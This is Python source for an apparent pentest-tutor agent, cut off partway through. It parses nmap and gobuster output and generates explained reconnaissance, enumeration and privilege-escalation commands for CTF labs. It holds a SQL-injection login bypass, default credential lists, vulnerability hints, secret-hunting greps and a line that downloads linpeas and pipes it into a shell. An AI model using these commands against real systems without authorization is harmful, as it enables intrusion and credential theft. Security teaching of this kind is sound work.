"""Herramientas del Cybersecurity Tutor.

Filosofía: este agente es un TUTOR, no un ejecutor.
No lanza comandos ni herramientas. Su función es:

    1. Analizar output pegado por el estudiante y estructurarlo
    2. Generar comandos explicados listos para ejecutar en la VM
    3. Proporcionar referencia técnica (cheatsheets, conceptos, metodología)
    4. Guiar el razonamiento y el flujo profesional de pentesting

Sin subprocess. Sin dependencias externas. Solo lógica Python pura.
"""

import re


# ============================================================================
# ANÁLISIS DE OUTPUT — el estudiante pega, el tutor interpreta
# ============================================================================


def analyze_nmap_output(raw_output: str) -> dict:
    """Analiza output de nmap pegado por el estudiante.

    Extrae puertos, servicios y versiones de forma estructurada,
    genera recomendaciones específicas por servicio y sugiere los comandos
    exactos del siguiente paso dentro del flujo profesional.

    Args:
        raw_output: Output completo de nmap copiado desde la terminal.

    Returns:
        dict con puertos, servicios, OS hints, recomendaciones y siguiente paso.
    """
    if not raw_output or not raw_output.strip():
        return {
            "status": "error",
            "message": "El output está vacío. Pega el resultado completo de nmap.",
        }

    lines = raw_output.strip().split("\n")
    open_ports = []
    services = []
    os_hints = []
    nse_scripts = []
    target_ip = None

    for line in lines:
        stripped = line.strip()

        # Extraer IP del objetivo
        if not target_ip:
            ip_match = re.search(
                r"Nmap scan report for (?:[\w.-]+ \()?(\d{1,3}(?:\.\d{1,3}){3})",
                stripped,
            )
            if ip_match:
                target_ip = ip_match.group(1)

        # Parsear puertos abiertos
        # Formato: "80/tcp   open  http    Apache httpd 2.4.49 ((Unix))"
        port_match = re.match(
            r"^(\d+)/(tcp|udp)\s+(open|filtered)\s+(\S+)\s*(.*)?$", stripped
        )
        if port_match and port_match.group(3) == "open":
            port_num = int(port_match.group(1))
            proto = port_match.group(2)
            service_name = port_match.group(4)
            version_info = (port_match.group(5) or "").strip()
            open_ports.append(port_num)
            services.append(
                {
                    "port": port_num,
                    "protocol": proto,
                    "service": service_name.lower(),
                    "version": version_info,
                    "raw": stripped,
                }
            )

        # OS hints
        if any(kw in stripped for kw in ["OS:", "Running:", "OS details:", "OS CPE:"]):
            os_hints.append(stripped)

        # NSE scripts relevantes
        if stripped.startswith("|"):
            nse_scripts.append(stripped)

    if not open_ports:
        return {
            "status": "no_open_ports",
            "message": (
                "No se encontraron puertos abiertos. Posibles causas: "
                "ICMP bloqueado (prueba -Pn), firewall filtrando, host inactivo, "
                "o el escaneo solo cubrió top-1000 puertos (prueba -p-)."
            ),
        }

    recommendations = _build_service_recommendations(services, target_ip)
    next_step = _suggest_next_nmap(services, open_ports, target_ip)

    return {
        "status": "success",
        "target": target_ip or "desconocido",
        "open_ports": open_ports,
        "port_count": len(open_ports),
        "services": services,
        "os_hints": os_hints,
        "nse_relevant": nse_scripts[:15],
        "service_recommendations": recommendations,
        "next_step": next_step,
    }


def _suggest_next_nmap(services: list, open_ports: list, target_ip: str) -> dict:
    ip = target_ip or "<IP>"
    ports_str = ",".join(str(p) for p in sorted(open_ports))
    has_web = any(s["port"] in {80, 443, 8080, 8443, 8000, 8888} for s in services)
    has_smb = any(s["port"] in {139, 445} for s in services)
    probably_all_ports = len(open_ports) >= 15

    suggestions = []

    if not probably_all_ports:
        suggestions.append(
            {
                "objetivo": "Escaneo completo de los 65535 puertos",
                "comando": f"nmap -p- --open -T4 {ip} -oN full_ports.txt",
                "razon": "Los servicios en puertos no estándar son muy comunes en CTFs/HTB. El escaneo por defecto solo cubre los top-1000.",
            }
        )

    suggestions.append(
        {
            "objetivo": "Scripts NSE + versiones exactas en puertos conocidos",
            "comando": f"nmap -sC -sV -p {ports_str} {ip} -oN targeted.txt",
            "razon": "-sC ejecuta scripts de enumeración por defecto. Las versiones exactas son necesarias para buscar CVEs específicos.",
        }
    )

    if has_smb:
        suggestions.append(
            {
                "objetivo": "Scripts SMB específicos",
                "comando": f"nmap --script=smb-enum-shares,smb-enum-users,smb-vuln* -p 139,445 {ip}",
                "razon": "SMB puede exponer shares, usuarios y vulnerabilidades críticas (EternalBlue).",
            }
        )

    if has_web:
        suggestions.append(
            {
                "objetivo": "Enumeración HTTP con NSE (complementa gobuster)",
                "comando": f"nmap --script=http-enum,http-title,http-methods -p 80,443 {ip}",
                "razon": "http-enum descubre rutas comunes, http-title muestra el título de cada página.",
            }
        )

    return {
        "descripcion": "Siguientes pasos recomendados basados en los servicios encontrados:",
        "comandos": suggestions,
    }


def _build_service_recommendations(services: list, target_ip: str) -> list:
    recs = []
    ip = target_ip or "<IP>"
    ports = {s["port"] for s in services}
    service_names = {s["service"] for s in services}

    def get_version(port_num):
        for s in services:
            if s["port"] == port_num:
                return s["version"]
        return ""

    if 21 in ports or "ftp" in service_names:
        v = get_version(21)
        recs.append(
            {
                "servicio": f"FTP (21) {v}".strip(),
                "prioridad": "alta",
                "razon": "FTP puede tener acceso anónimo habilitado o versiones con exploits conocidos (vsftpd 2.3.4 tiene backdoor).",
                "comandos": [
                    f"ftp {ip}  # user: anonymous / pass: anonymous",
                    f"nmap --script=ftp-anon,ftp-syst -p 21 {ip}",
                ],
                "buscar_exploit": f"searchsploit {v.split()[0] if v else 'vsftpd'}",
            }
        )

    if 22 in ports or "ssh" in service_names:
        v = get_version(22)
        recs.append(
            {
                "servicio": f"SSH (22) {v}".strip(),
                "prioridad": "baja-inicial",
                "razon": "SSH raramente se explota directamente. Prioridad baja ahora — útil con credenciales obtenidas en otras fases.",
                "comandos": [
                    f"nc -nv {ip} 22  # banner grabbing — versión exacta",
                ],
                "buscar_exploit": f"searchsploit openssh {v.split()[-1] if v else ''}".strip(),
            }
        )

    if 25 in ports or "smtp" in service_names:
        recs.append(
            {
                "servicio": "SMTP (25)",
                "prioridad": "media",
                "razon": "Permite enumerar usuarios del sistema con VRFY/EXPN/RCPT TO.",
                "comandos": [
                    f"nc -nv {ip} 25",
                    f"smtp-user-enum -M VRFY -U /usr/share/wordlists/metasploit/unix_users.txt -t {ip}",
                ],
                "buscar_exploit": "searchsploit smtp",
            }
        )

    web_ports = [
        s
        for s in services
        if s["port"] in {80, 443, 8080, 8443, 8000, 8888} or "http" in s["service"]
    ]
    for ws in web_ports:
        proto = "https" if ws["port"] in {443, 8443} else "http"
        port_suffix = f":{ws['port']}" if ws["port"] not in {80, 443} else ""
        v = ws["version"]
        recs.append(
            {
                "servicio": f"HTTP {port_suffix} {v}".strip(),
                "prioridad": "alta",
                "razon": "Superficie de ataque principal. Revisión manual + fuzzing suele revelar los vectores más relevantes.",
                "comandos": [
                    "# Abrir en browser y revisar código fuente (Ctrl+U), robots.txt, /sitemap.xml",
                    f"curl -sv {proto}://{ip}{port_suffix}  # headers del servidor",
                    f"gobuster dir -u {proto}://{ip}{port_suffix} -w /usr/share/wordlists/dirb/common.txt -x php,html,txt,bak -t 30",
                ],
                "buscar_exploit": f"searchsploit {v.split()[0] if v else 'apache nginx'}",
                "nota": "Revisar: robots.txt, comentarios HTML, cookies, formularios, /.git, /.env",
            }
        )

    if (
        139 in ports
        or 445 in ports
        or "smb" in service_names
        or "microsoft-ds" in service_names
    ):
        recs.append(
            {
                "servicio": "SMB (139/445)",
                "prioridad": "alta",
                "razon": "SMB puede exponer shares con datos sensibles, usuarios del sistema y puede ser vulnerable a exploits críticos.",
                "comandos": [
                    f"smbclient -L //{ip} -N",
                    f"enum4linux -a {ip}",
                    f"crackmapexec smb {ip}",
                    f"nmap --script=smb-vuln* -p 445 {ip}",
                ],
                "buscar_exploit": "searchsploit SMB MS17-010 EternalBlue",
            }
        )

    if 3306 in ports or "mysql" in service_names:
        recs.append(
            {
                "servicio": f"MySQL (3306) {get_version(3306)}".strip(),
                "prioridad": "alta",
                "razon": "MySQL expuesto a la red suele indicar misconfiguration. Credenciales por defecto o acceso sin contraseña.",
                "comandos": [
                    f"mysql -u root -h {ip}",
                    f"nmap --script=mysql-info,mysql-empty-password -p 3306 {ip}",
                ],
                "buscar_exploit": "searchsploit mysql",
            }
        )

    if 6379 in ports or "redis" in service_names:
        recs.append(
            {
                "servicio": "Redis (6379)",
                "prioridad": "crítica",
                "razon": "Redis sin autenticación permite RCE mediante escritura de archivos (authorized_keys, cron jobs).",
                "comandos": [
                    f"redis-cli -h {ip} info",
                    f"redis-cli -h {ip} config get *",
                ],
                "buscar_exploit": "searchsploit redis unauthenticated",
            }
        )

    if 111 in ports or "rpcbind" in service_names:
        recs.append(
            {
                "servicio": "RPC/portmapper (111)",
                "prioridad": "media",
                "razon": "Puede indicar NFS expuesto. NFS mal configurado expone el sistema de archivos.",
                "comandos": [
                    f"rpcinfo -p {ip}",
                    f"showmount -e {ip}",
                ],
                "buscar_exploit": "searchsploit NFS misconfiguration",
            }
        )

    if not recs:
        recs.append(
            {
                "servicio": "Servicios no estándar",
                "prioridad": "pendiente",
                "razon": "No se detectaron servicios comunes conocidos. Examinar cada puerto manualmente.",
                "comandos": [f"nc -nv {ip} <PUERTO>  # banner grabbing"],
                "buscar_exploit": "",
            }
        )

    return recs


def analyze_gobuster_output(raw_output: str, base_url: str = "") -> dict:
    """Analiza output de gobuster/ffuf pegado por el estudiante.

    Clasifica rutas por código de respuesta e interés, identifica
    hallazgos críticos y sugiere qué investigar primero.

    Args:
        raw_output: Output de gobuster dir o ffuf pegado desde la terminal.
        base_url: URL base del objetivo para construir URLs completas.

    Returns:
        dict con rutas clasificadas y pasos de investigación priorizados.
    """
    if not raw_output or not raw_output.strip():
        return {"status": "error", "message": "Output vacío."}

    lines = raw_output.strip().split("\n")
    found_paths = []

    gobuster_re = re.compile(
        r"^(/\S*)\s+\(Status:\s*(\d+)\)(?:.*\[Size:\s*(\d+)\])?(?:.*-->\s*(\S+))?"
    )
    ffuf_re = re.compile(r"^(\S+)\s+\[Status:\s*(\d+),\s*Size:\s*(\d+)")

    for line in lines:
        s = line.strip()
        if (
            not s
            or s.startswith("=")
            or s.startswith("[INFO]")
            or s.startswith("Gobuster")
        ):
            continue

        m = gobuster_re.match(s) or ffuf_re.match(s)
        if m:
            path = m.group(1)
            if not path.startswith("/"):
                path = "/" + path
            status = int(m.group(2))
            size = int(m.group(3)) if m.group(3) else None
            redirect = m.group(4) if len(m.groups()) >= 4 and m.group(4) else None

            found_paths.append(
                {
                    "path": path,
                    "status": status,
                    "size": size,
                    "redirect": redirect,
                    "interest": _rate_path_interest(path, status),
                }
            )

    if not found_paths:
        return {
            "status": "no_results",
            "message": "No se encontraron rutas. Considera: wordlist más grande, añadir extensiones (-x php,html,txt,bak), o verificar que la URL objetivo es correcta.",
        }

    high = [p for p in found_paths if p["interest"] == "alta"]
    medium = [p for p in found_paths if p["interest"] == "media"]
    investigation = _generate_web_investigation(found_paths, base_url)

    return {
        "status": "success",
        "total_found": len(found_paths),
        "all_paths": found_paths,
        "high_interest": high,
        "medium_interest": medium,
        "investigation_steps": investigation,
    }


def _rate_path_interest(path: str, status: int) -> str:
    p = path.lower()
    high = [
        "admin",
        "login",
        "wp-admin",
        "phpmyadmin",
        "manager",
        "console",
        "dashboard",
        "panel",
        "config",
        "backup",
        ".git",
        ".env",
        ".htpasswd",
        "upload",
        "shell",
        "api",
        "swagger",
        "secret",
        "passwd",
        "id_rsa",
    ]
    medium = [
        "user",
        "account",
        "profile",
        "settings",
        "register",
        "reset",
        "password",
        "auth",
        "token",
        "download",
        "file",
        "page",
    ]
    if any(kw in p for kw in high):
        return "alta"
    if status == 200 or any(kw in p for kw in medium):
        return "media"
    return "baja"


def _generate_web_investigation(paths: list, base_url: str) -> list:
    steps = []
    base = base_url.rstrip("/") if base_url else "http://<IP>"

    git_paths = [
        p for p in paths if ".git" in p["path"].lower() and p["status"] in {200, 403}
    ]
    if git_paths:
        steps.append(
            {
                "prioridad": "CRÍTICA",
                "ruta": "/.git/",
                "accion": "Repositorio Git expuesto — puede contener código fuente completo, historial de commits con credenciales y configuración.",
                "comandos": [
                    f"git-dumper {base}/.git/ ./dumped_repo",
                    "cd dumped_repo && git log --oneline",
                    "grep -r 'password\\|secret\\|key\\|token' . --include='*.php' --include='*.py' --include='*.env'",
                ],
            }
        )

    env_paths = [p for p in paths if ".env" in p["path"].lower() and p["status"] == 200]
    if env_paths:
        steps.append(
            {
                "prioridad": "CRÍTICA",
                "ruta": "/.env",
                "accion": "Archivo .env expuesto — contiene credenciales de base de datos, API keys y configuración de la aplicación.",
                "comandos": [f"curl {base}/.env"],
            }
        )

    admin_paths = [
        p
        for p in paths
        if any(
            kw in p["path"].lower()
            for kw in ["admin", "login", "panel", "dashboard", "console", "manager"]
        )
        and p["status"] in {200, 301, 302}
    ]
    if admin_paths:
        steps.append(
            {
                "prioridad": "alta",
                "ruta": " | ".join(p["path"] for p in admin_paths[:4]),
                "accion": "Panel de administración encontrado. Probar credenciales por defecto, luego SQLi básico.",
                "credenciales_defecto": [
                    "admin:admin",
                    "admin:password",
                    "admin:123456",
                    "root:root",
                    "administrator:administrator",
                ],
                "sqli_test": "Username: admin'-- | Password: cualquier cosa",
            }
        )

    interesting_dirs = [
        p
        for p in paths
        if p["interest"] in {"alta", "media"}
        and p["status"] in {200, 301, 302, 403}
        and not any(x in p["path"].lower() for x in [".git", ".env", "admin", "login"])
    ]
    for d in interesting_dirs[:4]:
        steps.append(
            {
                "prioridad": "media",
                "ruta": d["path"],
                "accion": f"Fuzzing recursivo en esta ruta (status: {d['status']})",
                "comandos": [
                    f"gobuster dir -u {base}{d['path']} -w /usr/share/wordlists/dirb/common.txt -x php,html,txt -t 20",
                ],
            }
        )

    return steps


def analyze_service_version(service: str, version: str = "") -> dict:
    """Analiza un servicio y versión específicos encontrados en enumeración.

    Proporciona contexto sobre vectores de ataque conocidos, vulnerabilidades
    históricas y los comandos de searchsploit para investigar en la VM.

    Args:
        service: Nombre del servicio (ej: 'apache', 'vsftpd', 'openssh', 'drupal').
        version: Versión encontrada (ej: '2.4.49', '2.3.4', '7.4p1').

    Returns:
        dict con análisis del servicio, vectores conocidos y comandos de búsqueda.
    """
    if not service:
        return {"status": "error", "message": "Parámetro 'service' requerido."}

    sl = service.lower().strip()
    vc = version.strip()

    known = {
        "vsftpd": {
            "notas": "vsftpd 2.3.4 contiene un backdoor deliberado (CVE-2011-2523) — conectar al puerto 6200 tras trigger con ':)' en el username.",
            "criticos": {"2.3.4": "Backdoor CVE-2011-2523 — RCE directo"},
            "vector": "Backdoor en 6200, anonymous login",
        },
        "proftpd": {
            "notas": "ProFTPD 1.3.5 tiene módulo mod_copy explotable sin auth (SITE CPFR/CPTO).",
            "criticos": {"1.3.5": "mod_copy arbitrary file copy — CVE-2015-3306"},
            "vector": "SITE CPFR/CPTO sin autenticación",
        },
        "apache": {
            "notas": "Apache 2.4.49 y 2.4.50 tienen Path Traversal + RCE crítico (CVE-2021-41773 y 42013).",
            "criticos": {
                "2.4.49": "Path Traversal + RCE — CVE-2021-41773",
                "2.4.50": "Bypass del fix — CVE-2021-42013",
            },
            "vector": "Directory traversal, mod_cgi RCE",
        },
        "openssh": {
            "notas": "OpenSSH es generalmente robusto. Versiones muy antiguas tienen user enumeration.",
            "criticos": {"7.2p1": "User enumeration CVE-2016-6210"},
            "vector": "User enumeration en versiones antiguas, credenciales débiles",
        },
        "samba": {
            "notas": "Samba tiene historial de CVEs críticos. EternalRed (CVE-2017-7494) da RCE sin auth.",
            "criticos": {"3.5.0": "EternalRed RCE CVE-2017-7494"},
            "vector": "CVE-2017-7494, null sessions, misconfigured shares",
        },
        "redis": {
            "notas": "Redis sin auth permite escritura de archivos arbitrarios → RCE, inyección SSH keys.",
            "criticos": {},
            "vector": "Unauthenticated RCE via config set dir/dbfilename + BGSAVE",
        },
        "php": {
            "notas": "PHP 8.1.0-dev tiene backdoor en header User-Agentt. PHP 5.x con múltiples LFI/RFI.",
            "criticos": {"8.1.0-dev": "Backdoor User-Agentt header — RCE directo"},
            "vector": "LFI, RFI, deserialization, backdoors en dev builds",
        },
        "tomcat": {
            "notas": "Tomcat con manager expuesto permite desplegar WARs maliciosos → shell. Ghostcat (CVE-2020-1938) en AJP.",
            "criticos": {"9.0": "Ghostcat CVE-2020-1938 via AJP"},
            "vector": "Manager app con credenciales débiles, WAR deployment",
        },
        "drupal": {
            "notas": "Drupalgeddon2 (CVE-2018-7600) da RCE sin autenticación en Drupal < 8.3.9/7.58.",
            "criticos": {
                "7": "Drupalgeddon SQLi→RCE",
                "8": "Drupalgeddon2 RCE sin auth CVE-2018-7600",
            },
            "vector": "Drupalgeddon2 si versión vulnerable",
        },
        "wordpress": {
            "notas": "WP tiene xmlrpc.php para brute force y plugins/themes con vulnerabilidades. wpscan es la herramienta estándar.",
            "criticos": {},
            "vector": "wpscan para enumerar plugins/themes/usuarios, xmlrpc.php brute force",
        },
        "mysql": {
            "notas": "MySQL expuesto a la red suele ser misconfiguration. UDF para RCE con FILE privilege.",
            "criticos": {},
            "vector": "Credenciales débiles/defecto, UDF injection, FILE privilege",
        },
    }

    matched_key = next((k for k in known if k in sl or sl in k), None)

    result = {
        "status": "success",
        "service": service,
        "version": vc,
        "searchsploit_commands": [
            f"searchsploit {service} {vc}".strip(),
            f"searchsploit {service}",
        ],
    }

    if matched_key:
        info = known[matched_key]
        result["known_vectors"] = info["notas"]
        result["main_attack_vector"] = info["vector"]
        for ver_pattern, cve in info["criticos"].items():
            if ver_pattern in vc:
                result["critical_match"] = {
                    "alerta": "⚠️  VERSIÓN POTENCIALMENTE VULNERABLE",
                    "cve": cve,
                    "version_detectada": vc,
                }
                break
    else:
        result["known_vectors"] = (
            f"'{service}' no está en la base de conocimiento integrada. Usa searchsploit para búsqueda exhaustiva."
        )

    return result


# ============================================================================
# GENERACIÓN DE COMANDOS EXPLICADOS POR FASE
# ============================================================================


def generate_pentest_commands(phase: str, target_ip: str, context: str = "") -> dict:
    """Genera el conjunto de comandos para una fase específica del pentesting.

    Proporciona los comandos ordenados por prioridad con explicación de
    cada flag y qué información estamos buscando. El flujo sigue la
    metodología estándar profesional (PTES / OWASP Testing Guide).

    Args:
        phase: Fase del pentesting:
                'reconnaissance' | 'web_enumeration' | 'smb_enumeration' |
                'post_exploitation_linux' | 'post_exploitation_windows' |
                'password_attacks' | 'pivoting'
        target_ip: IP del objetivo (se inserta en los comandos).
        context: Contexto adicional (ej: 'puerto 8080, apache 2.4.49').

    Returns:
        dict con pasos ordenados, explicaciones y notas profesionales.
    """
    if not phase:
        return {
            "status": "error",
            "message": "Especifica una fase.",
            "available": "reconnaissance, web_enumeration, smb_enumeration, post_exploitation_linux, post_exploitation_windows, password_attacks, pivoting",
        }

    ip = target_ip or "<IP>"

    phases = {
        "reconnaissance": {
            "nombre": "Reconocimiento — Mapeo de superficie de ataque",
            "objetivo": "Identificar todos los puertos abiertos, servicios en ejecución y sus versiones exactas. Esta fase define todo lo que viene después.",
            "pasos": [
                {
                    "n": 1,
                    "nombre": "Verificar conectividad",
                    "comando": f"ping -c 3 {ip}",
                    "por_que": "Confirmar que el host está activo antes de invertir tiempo en escaneos. Si no responde, no significa que esté caído — ICMP puede estar filtrado.",
                    "si_falla": f"Continúa con nmap -Pn -sV {ip} (omite el host discovery)",
                },
                {
                    "n": 2,
                    "nombre": "Escaneo rápido — puertos comunes con versiones",
                    "comando": f"nmap -sV --open -T4 {ip} -oN recon_initial.txt",
                    "por_que": "-sV detecta versiones de servicios. --open filtra solo puertos abiertos. -T4 acelera sin ser demasiado agresivo. -oN guarda el output — en real esto es evidencia del engagement.",
                    "que_buscar": "Nombres de servicios, versiones exactas, puertos inusuales.",
                },
                {
                    "n": 3,
                    "nombre": "Escaneo completo — todos los 65535 puertos",
                    "comando": f"nmap -p- --open -T4 {ip} -oN recon_all_ports.txt",
                    "por_que": "El escaneo por defecto cubre solo top-1000. En HTB/THM es muy común encontrar servicios clave en puertos no estándar (SSH en 2222, web en 8080, 9090, etc.). Este paso puede tardar 5-15 min.",
                    "que_buscar": "Cualquier puerto que no apareció en el escaneo inicial.",
                },
                {
                    "n": 4,
                    "nombre": "Scripts NSE + versiones en los puertos encontrados",
                    "comando": f"nmap -sC -sV -p <PUERTOS_PASO_2_Y_3> {ip} -oN recon_targeted.txt",
                    "por_que": "-sC ejecuta el conjunto de scripts NSE 'default': grabbing de banners, credenciales por defecto, enumeración de servicios. Junto a -sV da versiones exactas necesarias para buscar CVEs.",
                    "que_buscar": "Versiones exactas (ej: Apache 2.4.49), resultados de scripts NSE, posibles credenciales por defecto.",
                },
            ],
            "notas_profesionales": [
                "Siempre guardar output con -oN o -oA. En pentests reales es evidencia y parte del reporte.",
                "En HTB/CTF: -T4 es aceptable. En entornos reales: acordar nivel de intrusividad con el cliente (ROE).",
                "Un puerto 'filtered' puede ser firewall stateful — no descartar el servicio, probar con -Pn o desde otra IP.",
                "Guardar los escaneos con nombres descriptivos: initial_scan, all_ports, targeted_{IP}.",
            ],
        },
        "web_enumeration": {
            "nombre": "Enumeración web — Mapeo completo de la aplicación",
            "objetivo": "Identificar tecnologías, directorios, archivos, parámetros y puntos de entrada. El análisis manual siempre precede al automatizado.",
            "pasos": [
                {
                    "n": 1,
                    "nombre": "Inspección manual en browser — SIEMPRE PRIMERO",
                    "comando": f"# Visitar: http://{ip}\n# → Ctrl+U (código fuente)\n# → F12 DevTools → Network, Console\n# → /robots.txt\n# → /sitemap.xml",
                    "por_que": "La revisión manual revela lo que ningún scanner encuentra: comentarios HTML con credenciales, rutas en archivos JS, nombres de frameworks, tokens en cookies. robots.txt puede listar directorios 'ocultos' que el admin quería que los crawlers ignoraran.",
                    "que_buscar": "Comentarios <!-- --> con info, includes de JS externos, nombres de frameworks/CMS, cookies de sesión y su formato, formularios de login.",
                },
                {
                    "n": 2,
                    "nombre": "Identificar tecnologías y versiones",
                    "comando": f"whatweb -v http://{ip}\ncurl -sv http://{ip} 2>&1 | grep -iE 'server:|x-powered-by:|set-cookie:'",
                    "por_que": "whatweb identifica CMS (WordPress, Drupal), frameworks y versiones. Los headers HTTP revelan el servidor web y lenguaje backend — datos necesarios para buscar exploits específicos.",
                    "que_buscar": "WordPress → wpscan. Drupal → Drupalgeddon. Versión PHP exacta. Servidor web y versión.",
                },
                {
                    "n": 3,
                    "nombre": "Fuzzing de directorios — wordlist pequeña primero",
                    "comando": f"gobuster dir -u http://{ip} -w /usr/share/wordlists/dirb/common.txt -x php,html,txt,bak -t 30 -o gobuster_common.txt",
                    "por_que": "common.txt (~4500 entradas) da resultados en 1-2 min. Las extensiones son críticas: .bak puede ser backup de código con credenciales, .txt puede tener passwords en texto claro.",
                    "que_buscar": "Paneles admin, /upload, /.git, /.env, archivos de configuración, APIs.",
                },
                {
                    "n": 4,
                    "nombre": "Wordlist media si common.txt no es suficiente",
                    "comando": f"gobuster dir -u http://{ip} -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 30 -o gobuster_medium.txt",
                    "por_que": "~220k entradas. Usar cuando el escaneo inicial da pocos resultados o la app parece tener muchas rutas.",
                    "que_buscar": "Subdirectorios de rutas ya encontradas, rutas de API no documentadas.",
                },
                {
                    "n": 5,
                    "nombre": "Fuzzing de subdominios / virtual hosts (si hay dominio)",
                    "comando": f"gobuster vhost -u http://<DOMINIO> -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt --append-domain\nffuf -u http://{ip} -H 'Host: FUZZ.<DOMINIO>' -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -c -fs <TAMAÑO_BASE>",
                    "por_que": "Las aplicaciones con dominios suelen tener subdominios con contenido diferente: dev.ejemplo.com, admin.ejemplo.com, api.ejemplo.com. Los virtual hosts responden según el header Host.",
                    "que_buscar": "Subdominios con interfaces de admin, APIs internas, entornos de desarrollo.",
                },
            ],
            "notas_profesionales": [
                "El análisis manual siempre antes que los scanners — los scanners se pierden el contexto.",
                "Un 403 Forbidden NO significa que no puedes acceder — hay múltiples técnicas de bypass.",
                "Documentar cada ruta interesante con captura o curl output antes de continuar.",
                "Si encuentras WordPress: wpscan --url http://<IP> --enumerate p,t,u",
                "Si encuentras Drupal: comprobar /CHANGELOG.txt para versión exacta → Drupalgeddon2.",
            ],
        },
        "smb_enumeration": {
            "nombre": "Enumeración SMB — Shares, usuarios y vulnerabilidades",
            "objetivo": "Mapear shares accesibles, usuarios del sistema/dominio, políticas y posibles vulnerabilidades críticas.",
            "pasos": [
                {
                    "n": 1,
                    "nombre": "Información básica del servidor",
                    "comando": f"crackmapexec smb {ip}",
                    "por_que": "Una sola línea da: versión de Windows/Samba, nombre del equipo, dominio y si SMB signing está habilitado. SMB signing deshabilitado es requisito para NTLM relay attacks.",
                    "que_buscar": "Versión OS exacta, nombre de dominio, signing: False → posible relay.",
                },
                {
                    "n": 2,
                    "nombre": "Null session — listar shares sin credenciales",
                    "comando": f"smbclient -L //{ip} -N\nenum4linux -S {ip}",
                    "por_que": "Null session = autenticación vacía. En sistemas mal configurados (especialmente Samba antiguo) permite enumerar shares y a veces acceder directamente.",
                    "que_buscar": "Shares fuera de los estándar (IPC$, C$, ADMIN$). Cualquier share personalizado puede tener datos.",
                },
                {
                    "n": 3,
                    "nombre": "Enumeración completa con enum4linux",
                    "comando": f"enum4linux -a {ip} 2>&1 | tee enum4linux_full.txt",
                    "por_que": "-a ejecuta todas las comprobaciones: usuarios, grupos, shares, políticas de contraseñas, info de dominio. La lista de usuarios es especialmente valiosa para ataques posteriores (brute force SSH, Kerberoasting).",
                    "que_buscar": "Lista de usuarios (guardar para spray/brute force), política de contraseñas (longitud mínima, lockout).",
                },
                {
                    "n": 4,
                    "nombre": "Check de vulnerabilidades críticas",
                    "comando": f"nmap --script=smb-vuln* -p 445 {ip}",
                    "por_que": "EternalBlue (MS17-010) da acceso SYSTEM en Windows 7/Server 2008 sin parchear. Si el script reporta VULNERABLE → prioridad máxima.",
                    "que_buscar": "VULNERABLE: en cualquier CVE.",
                },
                {
                    "n": 5,
                    "nombre": "Acceder y descargar contenido de shares",
                    "comando": f"smbclient //{ip}/<SHARE> -N\n# Dentro:\n# ls\n# get <archivo>\n# recurse ON; prompt OFF; mget *",
                    "por_que": "Una vez identificados shares accesibles, revisar TODO el contenido. Archivos .xml, .conf, .txt, scripts de PowerShell/bash frecuentemente contienen credenciales en texto claro.",
                    "que_buscar": "Credenciales, configuraciones de sistemas, scripts de automatización, documentos internos.",
                },
            ],
            "notas_profesionales": [
                "crackmapexec permite spray de credenciales en toda una subred: cme smb 10.10.10.0/24 -u users.txt -p passwords.txt",
                "Si encuentras credenciales NTLM y SMB signing está deshabilitado: NTLM relay con responder + ntlmrelayx.",
                "smbmap es alternativa más visual para ver permisos: smbmap -H <IP>",
            ],
        },
        "post_exploitation_linux": {
            "nombre": "Post-explotación Linux — Escalada de privilegios",
            "objetivo": "Desde shell de usuario sin privilegios → root. Seguir el orden: sudo → SUID → cron → capabilities → kernel (último recurso).",
            "pasos": [
                {
                    "n": 1,
                    "nombre": "Orientación inicial — contexto del sistema",
                    "comando": "id && whoami\nhostname && ip a\nuname -a\ncat /etc/os-release",
                    "por_que": "Los primeros comandos tras obtener shell. Establecer: usuario y grupos actuales (grupos docker/lxd son escalada directa), hostname (¿hay red interna a pivotar?), versión del kernel (para kernel exploits).",
                    "que_buscar": "Grupos especiales: docker, lxd, disk, adm, sudo. Kernel muy antiguo.",
                },
                {
                    "n": 2,
                    "nombre": "sudo -l — SIEMPRE EL PRIMER VECTOR A COMPROBAR",
                    "comando": "sudo -l",
                    "por_que": "Muestra qué comandos puede ejecutar tu usuario como root. Es el vector más común en CTFs por su configuración incorrecta frecuente. NOPASSWD en cualquier binario → consultar gtfobins.github.io.",
                    "que_buscar": "(ALL) NOPASSWD: cualquier binario = probablemente escalada directa. Revisar en gtfobins.github.io.",
                },
                {
                    "n": 3,
                    "nombre": "Buscar binarios SUID inusuales",
                    "comando": "find / -perm -u=s -type f 2>/dev/null",
                    "por_que": "Los SUID se ejecutan con los privilegios del propietario. Si root tiene SUID en un binario explotable → escalada. Los SUID normales del sistema (passwd, su, sudo) no son vectores.",
                    "que_buscar": "Binarios fuera de /usr/bin /bin /sbin. Cualquier binario personalizado o inusual.",
                },
                {
                    "n": 4,
                    "nombre": "Revisar cron jobs de root",
                    "comando": "cat /etc/crontab\nls -la /etc/cron.*\ncat /var/spool/cron/crontabs/* 2>/dev/null\n./pspy64  # ver procesos en tiempo real sin root",
                    "por_que": "Si root ejecuta un script que tú puedes modificar → inyectar reverse shell. pspy monitoriza fork/exec en tiempo real y descubre crons que no aparecen en los archivos habituales.",
                    "que_buscar": "Scripts en rutas escribibles por tu usuario, wildcards en tar/cp/rsync (tarball injection), scripts cuyo directorio es escribible.",
                },
                {
                    "n": 5,
                    "nombre": "Capabilities y servicios internos",
                    "comando": "getcap -r / 2>/dev/null\nss -tlnp\nenv | grep -iE 'pass|secret|key|token'",
                    "por_que": "Capabilities como cap_setuid en python3 → escalada directa. ss muestra servicios en localhost que pueden ser vectores de explotación. Variables de entorno a veces contienen credenciales.",
                    "que_buscar": "cap_setuid o cap_sys_admin en cualquier binario. Servicios en 127.0.0.1 que no están expuestos externamente.",
                },
                {
                    "n": 6,
                    "nombre": "LinPEAS — enumeración automática completa",
                    "comando": "# Servidor en tu Kali:\npython3 -m http.server 8000\n\n# En target:\ncurl http://<KALI_IP>:8000/linpeas.sh | sh 2>&1 | tee linpeas_output.txt",
                    "por_que": "LinPEAS cubre cientos de vectores automáticamente. Útil cuando la enumeración manual no encuentra nada obvio. Las líneas en rojo/amarillo son hallazgos de alta prioridad.",
                    "que_buscar": "Rojo = crítico. Amarillo = a investigar. Presta especial atención a: CVEs del kernel, writable paths en PATH, contraseñas en archivos de config.",
                },
            ],
            "notas_profesionales": [
                "Orden de prioridad: sudo → SUID → cron → capabilities → servicios internos → kernel exploit.",
                "Kernel exploits como último recurso — son inestables y pueden crashear el sistema.",
